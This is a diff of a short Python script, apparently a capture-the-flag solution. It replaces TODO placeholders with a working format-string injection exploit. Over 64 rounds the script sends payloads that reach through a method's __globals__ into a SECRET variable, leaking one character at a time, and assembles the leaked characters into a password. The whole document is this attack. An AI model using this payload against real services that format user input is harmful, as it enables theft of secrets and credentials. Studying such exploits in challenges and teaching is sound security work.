@@ -4,9 +4,9 @@ password = ""
 
 for i in range(64):
     print(0)
-    print("HACK_EVERYTHING") # TODO: find how to hack everything
+    print("{self.ask_secret.__globals__[SECRET][%d]}>9" % (i,))
     input()
     input()
-    password += extract_password_char(input()) # TODO: find how to extract a password character
+    password += input()[10]
     print(password)
     input()
